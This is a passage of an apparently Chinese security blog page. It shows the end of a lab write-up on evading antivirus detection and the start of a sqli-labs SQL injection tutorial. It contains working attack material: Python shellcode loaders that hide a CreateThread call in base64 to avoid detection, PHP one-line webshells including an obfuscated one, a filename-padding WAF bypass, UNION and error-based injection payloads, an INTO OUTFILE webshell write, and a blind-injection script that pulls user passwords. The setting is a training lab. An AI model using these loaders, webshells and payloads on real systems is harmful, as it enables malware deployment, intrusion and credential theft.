+<h4 id="4-4靶机脚本检测出木马，删除此文件"><a href="#4-4靶机脚本检测出木马，删除此文件" class="headerlink" title="4.4靶机脚本检测出木马，删除此文件"></a>4.4靶机脚本检测出木马，删除此文件</h4>
+
+<h4 id="4-5用x64dbj加入垃圾指令"><a href="#4-5用x64dbj加入垃圾指令" class="headerlink" title="4.5用x64dbj加入垃圾指令"></a>4.5用x64dbj加入垃圾指令</h4><p>&emsp;&emsp;例：由下图一加工成图二</p>
+
+
+<h4 id="4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行"><a href="#4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行"></a>4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行</h4>
+
+<h4 id="4-7centos操作机监听并运行指令"><a href="#4-7centos操作机监听并运行指令" class="headerlink" title="4.7centos操作机监听并运行指令"></a>4.7centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
+
+
+<h3 id="5-拆分PE绕过实验"><a href="#5-拆分PE绕过实验" class="headerlink" title="5.拆分PE绕过实验"></a>5.拆分PE绕过实验</h3><h4 id="5-1开启模拟病毒检测脚本"><a href="#5-1开启模拟病毒检测脚本" class="headerlink" title="5.1开启模拟病毒检测脚本"></a>5.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py</p>
+
+
+<h4 id="5-2在操作机上上访问-http-192-168-43-106-8082"><a href="#5-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="5.2在操作机上上访问 http://192.168.43.106:8082/"></a>5.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
+
+<h4 id="5-3在操作机上传client1-exe文件"><a href="#5-3在操作机上传client1-exe文件" class="headerlink" title="5.3在操作机上传client1.exe文件"></a>5.3在操作机上传client1.exe文件</h4>
+
+<h4 id="5-4靶机脚本检测出木马，删除此文件"><a href="#5-4靶机脚本检测出木马，删除此文件" class="headerlink" title="5.4靶机脚本检测出木马，删除此文件"></a>5.4靶机脚本检测出木马，删除此文件</h4>
+
+<h4 id="5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"><a href="#5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行" class="headerlink" title="5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"></a>5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行</h4><p>&emsp;&emsp;用pyinstaller拆分的文件</p>
+
+
+<p>&emsp;&emsp;上传</p>
+
+
+<h4 id="5-6centos操作机监听并运行指令"><a href="#5-6centos操作机监听并运行指令" class="headerlink" title="5.6centos操作机监听并运行指令"></a>5.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息</p>
+
+
+<h3 id="6-加载器绕过"><a href="#6-加载器绕过" class="headerlink" title="6.加载器绕过"></a>6.加载器绕过</h3><h4 id="6-1编写loader"><a href="#6-1编写loader" class="headerlink" title="6.1编写loader"></a>6.1编写loader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;test.txt&#39;)</span><br><span class="line">scode &#x3D; file.read()</span><br><span class="line">scode &#x3D; bytes(scode,encoding &#x3D; &#39;utf-8&#39;)</span><br><span class="line">shellcode &#x3D; bytearray(scode)   &#x2F;&#x2F;打开文件读取并转化数据类型</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64 &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40)) &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)&#x2F;&#x2F;复制移动内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;) </span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-2生成shellcode"><a href="#6-2生成shellcode" class="headerlink" title="6.2生成shellcode"></a>6.2生成shellcode</h4>
+
+<h4 id="6-3填充shellcode"><a href="#6-3填充shellcode" class="headerlink" title="6.3填充shellcode"></a>6.3填充shellcode</h4>
+
+<h4 id="6-4运行加载器并查看结果"><a href="#6-4运行加载器并查看结果" class="headerlink" title="6.4运行加载器并查看结果"></a>6.4运行加载器并查看结果</h4><p>python loader.py</p>
+
+
+<h3 id="7-二分PE"><a href="#7-二分PE" class="headerlink" title="7.二分PE"></a>7.二分PE</h3><h4 id="7-1利用加载器原理编写peloader"><a href="#7-1利用加载器原理编写peloader" class="headerlink" title="7.1利用加载器原理编写peloader"></a>7.1利用加载器原理编写peloader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;payload.bin&#39;,&#39;rb&#39;)</span><br><span class="line">scode &#x3D; file.read()    &#x2F;&#x2F;打开文件读取</span><br><span class="line">shellcode &#x3D; bytearray(binascii.b2a_hex(scode)) &#x2F;&#x2F;转成byte</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64  &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))  &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)  &#x2F;&#x2F;复制内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码（报毒定位通过分离文件查找）</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;)</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-2生成bin文件"><a href="#7-2生成bin文件" class="headerlink" title="7.2生成bin文件"></a>7.2生成bin文件</h4>
+
+<h4 id="7-3将payload-bin移到对应路径"><a href="#7-3将payload-bin移到对应路径" class="headerlink" title="7.3将payload.bin移到对应路径"></a>7.3将payload.bin移到对应路径</h4>
+
+<h4 id="7-4运行加载器并观察结果"><a href="#7-4运行加载器并观察结果" class="headerlink" title="7.4运行加载器并观察结果"></a>7.4运行加载器并观察结果</h4><p>python peloader.py</p>
+
+
+<h3 id="8-混淆绕过"><a href="#8-混淆绕过" class="headerlink" title="8.混淆绕过"></a>8.混淆绕过</h3><h4 id="8-1开启模拟病毒检测脚本"><a href="#8-1开启模拟病毒检测脚本" class="headerlink" title="8.1开启模拟病毒检测脚本"></a>8.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>（具体脚本信息请参考README.md或加壳.md）</p>
+
+
+<h4 id="8-2在操作机上上访问-http-192-168-43-106-8082"><a href="#8-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="8.2在操作机上上访问 http://192.168.43.106:8082/"></a>8.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
+
+<h4 id="8-3在操作机上传msf4-exe文件"><a href="#8-3在操作机上传msf4-exe文件" class="headerlink" title="8.3在操作机上传msf4.exe文件"></a>8.3在操作机上传msf4.exe文件</h4>
+
+<h4 id="8-4靶机脚本检测出木马，删除此文件"><a href="#8-4靶机脚本检测出木马，删除此文件" class="headerlink" title="8.4靶机脚本检测出木马，删除此文件"></a>8.4靶机脚本检测出木马，删除此文件</h4>
+
+<h4 id="8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行"><a href="#8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行" class="headerlink" title="8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行"></a>8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行</h4>
+
+<h4 id="8-6centos操作机监听并运行指令"><a href="#8-6centos操作机监听并运行指令" class="headerlink" title="8.6centos操作机监听并运行指令"></a>8.6centos操作机监听并运行指令</h4><p>在kali操作机上用msf监听4444端口，发现建立连接，使用getdesktop指令，发现可以获取靶机信息</p>
+
+
+<h3 id="9-垃圾字符绕过"><a href="#9-垃圾字符绕过" class="headerlink" title="9.垃圾字符绕过"></a>9.垃圾字符绕过</h3><h4 id="9-1在操作机上上访问-http-192-168-43-106-8083"><a href="#9-1在操作机上上访问-http-192-168-43-106-8083" class="headerlink" title="9.1在操作机上上访问 http://192.168.43.106:8083/"></a>9.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8083/">http://192.168.43.106:8083/</a></h4>
+
+<h4 id="9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截"><a href="#9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截" class="headerlink" title="9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截"></a>9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="9-3用burpsuit抓包，并加入垃圾字符"><a href="#9-3用burpsuit抓包，并加入垃圾字符" class="headerlink" title="9.3用burpsuit抓包，并加入垃圾字符"></a>9.3用burpsuit抓包，并加入垃圾字符</h4><p>下图一为原数据包，图二为改后数据包（在文件名前添加966位垃圾字符，使文件名长度为974位）</p>
+
+
+<h4 id="9-4显示上传成功"><a href="#9-4显示上传成功" class="headerlink" title="9.4显示上传成功"></a>9.4显示上传成功</h4>
+
+<h4 id="9-5用蚁剑连接成功"><a href="#9-5用蚁剑连接成功" class="headerlink" title="9.5用蚁剑连接成功"></a>9.5用蚁剑连接成功</h4>
+
+<h3 id="10-编码绕过"><a href="#10-编码绕过" class="headerlink" title="10.编码绕过"></a>10.编码绕过</h3><h4 id="10-1在操作机上上访问-http-192-168-43-106-8082"><a href="#10-1在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="10.1在操作机上上访问 http://192.168.43.106:8082/"></a>10.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4>
+<h4 id="10-2在操作机上传一句话木马hack-php"><a href="#10-2在操作机上传一句话木马hack-php" class="headerlink" title="10.2在操作机上传一句话木马hack.php"></a>10.2在操作机上传一句话木马hack.php</h4><p>&emsp;&emsp;内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-3被检测删除"><a href="#10-3被检测删除" class="headerlink" title="10.3被检测删除"></a>10.3被检测删除</h4>
+
+<h4 id="10-4上传编码后的一句话木马"><a href="#10-4上传编码后的一句话木马" class="headerlink" title="10.4上传编码后的一句话木马"></a>10.4上传编码后的一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);@$a($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-5用蚁剑连接成功"><a href="#10-5用蚁剑连接成功" class="headerlink" title="10.5用蚁剑连接成功"></a>10.5用蚁剑连接成功</h4>
+
+<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>通过本实验的学习，要求学员学会使用sigthief伪造签名以及了解签名的机制与作用，加载器的编写和使用msf构造shellcode，编写加载器，通过分离文件代码找到特征码并修改，利用donut将exe转换为bin，学习编写简单的木马检测脚本，能总结寻找木马特有的特征的方法，学会简单的加壳技术并通过文件对比来确定其差异，学习二进制知识进行花指令编写</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/28/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-sqli-labs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/27/sqli-labs/">sqli-labs</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/09/27/sqli-labs/" class="archive-article-date">
+  	<time datetime="2021-09-27T13:38:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/ni4n/blogs/mm9i2n">https://www.yuque.com/ni4n/blogs/mm9i2n</a></p>
+<p>1.确认闭合方法，注释后面（–+）<br>    (1) 单引号：<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,10&quot;; </code><br>        闭合方法：<code>id= -1&#39; --+</code><br>        闭合后语句：<code>SELECT * FROM users WHERE id=&#39;-1&#39; -- &#39; LIMIT 0,10</code><br>    (2) 无闭合：<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code><br>        闭合方法：<code>id= -1 --+</code><br>        闭合后语句：<code>SELECT * FROM users WHERE id=-1 -- LIMIT 0,10</code><br>    (3) 括号+单引号：<code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code><br>        闭合方法：<code>id= -1&#39;) --+ </code><br>        闭合后语句：<code>SELECT * FROM users WHERE id=(&#39;-1&#39;) -- &#39;) LIMIT 0,10</code><br>    (4) 括号+双引号：<code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code><br>        闭合方法：<code>id= -1&quot;) --+ </code><br>        闭合后语句：<code>SELECT * FROM users WHERE id=(&quot;-1&quot;) -- ) LIMIT 0,10</code><br>    (5) 双括号+单引号：<code>SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1</code><br>        闭合方法：<code>id= -1&#39;)) --+ </code><br>        闭合后语句：<code>SELECT * FROM users WHERE id=((&#39;-1&#39;)) -- &#39;)) LIMIT 0,10</code><br>2.用<code>order by 数字</code>确定有几列（数量多于列数会报错）<br>    比如：<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,10&quot;; </code><br>    加入方法方法：<code>id= -1&#39; order by 4--+</code><br>    闭合后语句：<code>SELECT * FROM users WHERE id=&#39;-1&#39;  order by 4 -- &#39; LIMIT 0,10</code><br>3.确定返回的位置（一般都是搜索数据的前n个）<br>4.联合查询(Less-1,Less-2，Less-3，Less-4)<br>先让前一个查询查不到数据，用于让出输出位（比如id=-1），然后<code>union select 1,2,3 --+</code>,其中的1,2,3可以换成别的参数，比如利用<code>group_concat(str1,str2...) --+</code>函数，作用是将返回字段的值进行连接，默认以逗号分隔。<br>    （1）<code>union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code>查询数据库名<br>    （2）<code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; --+</code>查询名为security的数据库的所有表名，其中<code>security</code>需要换成要查询的数据库<br>    （3）<code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+</code>查询数据库中所有名为users的表的列名，其中<code>users</code>可以换成要查询表名。如果要指定数据库，可以用<code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=&quot;security&quot; --+</code><br>    (4)<code>union select 1,group_concat(username),group_concat(password) from users--+</code>查询所有名为users的表的列名为username和password的数据，最好指定一下数据库——<code>union select 1,group_concat(username),group_concat(password) from security.users--+</code>，这其中可以换的有<code>username</code>(列名) <code>password</code>(列名) <code>security</code>(库名) <code>users</code>(表名)<br>    (5)补充：<code>@@datadir</code>：数据库路径<br>            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">5.报错注入(Less-5,Less-6)</span><br><span class="line">	一般php代码会包含这一句：&#96;&#96;&#96;print_r(mysqli_error($con));&#96;&#96;&#96;</span><br><span class="line">	版本限制：</span><br><span class="line">	&#123;%asset_img 1.PNG 1.PNG %&#125;</span><br><span class="line">	参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;zpy1998zpy&#x2F;article&#x2F;details&#x2F;80631036</span><br><span class="line">	[1]updatexml报错</span><br><span class="line">	比如&#96;&#96;&#96;updatexml(,,)&#96;&#96;&#96;三个参数分别为“值”“路径”“值”，所以前后两个可以随便填，中间那个填查询语句，会返回“找不到中间的路径”</span><br><span class="line">	与原句用&#96;&#96;&#96;and&#96;&#96;&#96;连接</span><br><span class="line">	(1)数据库名：&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata ),0x7e),3)--+&#96;&#96;&#96;(但是数据有长度限制，如果数据库名长度太长，会读不完)</span><br><span class="line">	(2)名为security的数据库的所有表名：&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; ),0x7e),3)--+&#96;&#96;&#96;</span><br><span class="line">	(3)数据库中所有名为users的表的列名:&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; ),0x7e),3)--+&#96;&#96;&#96;,指定数据库security:&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;&quot;security&quot;),0x7e),3)--+&#96;&#96;&#96;</span><br><span class="line">	(4)查询所有名为users的表的列名为username数据:&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(username) from users ),0x7e),3)--+&#96;&#96;&#96;指定数据库&#96;&#96;&#96;?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select group_concat(username) from security.users ),0x7e),3)--+&#96;&#96;&#96;</span><br><span class="line">	[2]update报错</span><br><span class="line">	&#96;&#96;&#96;updatexmll(,,)&#96;&#96;&#96;</span><br><span class="line">	例：&#96;&#96;&#96;uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select username from (select username from users)aa limit 0,1),0x7e),3)#submit&#x3D;submit&#96;&#96;&#96;(Less-17)</span><br><span class="line">6.利用&#96;&#96;&#96;outfile&#96;&#96;&#96; 将查询结果导出到文件里，或者写入一个马(Less-7)</span><br><span class="line">	(但前提是网站开启了一定的权限)</span><br><span class="line">	(1)利用联合查询查出路径信息&#96;&#96;&#96;?id&#x3D;-1 union select 1,@@datadir,@@basedir&#96;&#96;&#96;</span><br><span class="line">		比如查出的网站路径是&#96;&#96;&#96;&#x2F;var&#x2F;www&#x2F;html&#x2F;htdocs&#x2F;&#96;&#96;&#96;</span><br><span class="line">	(2)写一个木马进去，并标注其路径：&#96;&#96;&#96;?id&#x3D;1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;g&#39;]);?&gt;&quot;,3 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;htdocs&#x2F;a.php&#39;--+&#96;&#96;&#96;或者写入一句sql语句，让其执行：&#96;&#96;&#96;?id&#x3D;1&#39;)) union select 1,group_concat(username),group_concat(password) from users into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;htdocs&#x2F;a.php&#39;--+&#96;&#96;&#96;</span><br><span class="line">	(3）如果写入的是木马，就用蚁剑连接，如果写入的是查询语句，就直接访问文件，就会显示内容</span><br><span class="line">7.布尔盲注(Less-8)</span><br><span class="line">	出现这种注入，一般是会有以下的代码：</span><br></pre></td></tr></table></figure><br>    $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,2”;<br>$result=mysqli_query($con, $sql);<br>$row = mysqli_fetch_array($result, MYSQLI_BOTH);<br>#var_dump($row);<br>    if($row)<br>    {<br>      echo ‘<font size="5" color="#FFFF00">‘;<br>      echo ‘You are in………..’;<br>      echo “<br>“;<br>        echo “</font>“;<br>      }<br>    else<br>    {<br>    echo ‘<font size="5" color="#FFFF00">‘;<br>    //echo ‘You are in………..’;<br>    //print_r(mysqli_error($con));<br>    //echo “You have an error in your SQL syntax”;<br>    echo “</br></font>“;<br>    echo ‘<font color= "#0000ff" font size= 3>‘;<br>    }<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	当查询到内容时，会有回显。但是查询不到内容时，没有回显（或者回显不一样）</span><br><span class="line">	可以先用&#96;&#96;&#96;id&#x3D;1&#96;&#96;&#96;和&#96;&#96;&#96;id&#x3D;-1&#96;&#96;&#96;测试</span><br><span class="line"></span><br><span class="line">直接上代码：</span><br></pre></td></tr></table></figure></p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import requests</p>
+<p>url = ‘’’<a target="_blank" rel="noopener" href="http://localhost/Less-8/?id=1&#39;">http://localhost/Less-8/?id=1&#39;</a> and ‘’’ #必须是能查到的内容，-1是不行的<br>result = ‘’<br>i = 0</p>
+<p>while True:<br>    i = i+1<br>    head = 32<br>    tail = 127<br>    while head &lt; tail:<br>        mid = (tail + head) &gt;&gt;1<br>        #payload = f’if(ascii(substr((select database()),{i},1))&gt;{mid},1,0) %23’ #获取数据库<br>        #payload = f’if(ascii(substr((select table_name from information_schema.tables where table_schema = “security” limit 3,1),{i},1))&gt;{mid},1,0) %23’ #获取表名<br>        #payload = f’if(ascii(substr((select column_name from information_schema.columns where table_name = “users” limit 2,1),{i},1))&gt;{mid},1,0) %23’ #获取列名<br>        #payload = f’if(ascii(substr((select username from users limit 0,1),{i},1))&gt;{mid},1,0) %23’ #获取内容<br>        payload = f’if(ascii(substr((select password from users limit 2,1),{i},1))&gt;{mid},1,0) %23’ #数据库的第一个字符的下标是1，不是0 #修改limit后的第一个数可以“换行”<br>        r = requests.get(url+payload)<br>        if ‘You’ in r.text:<br>            head = mid + 1<br>        else:<br>            tail = mid<br>    if head != 32:<br>        result += chr(head)<br>    else:<br>        break<br>    print(result)</p>
